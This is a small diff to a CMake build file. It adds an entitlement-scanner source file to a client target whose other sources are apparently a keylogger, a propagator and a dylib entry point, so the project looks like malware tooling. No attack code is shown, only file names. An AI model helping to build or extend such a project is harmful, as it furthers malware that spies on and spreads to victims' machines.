@@ -89,6 +89,7 @@ add_executable(inferno_client
     client/src/KeyLogger.cpp
     client/src/Propagator.cpp
     client/src/entry_dylib.cpp
+    client/src/EntitlementScanner.cpp
 )
 target_link_libraries(inferno_client PRIVATE inferno_common)
 
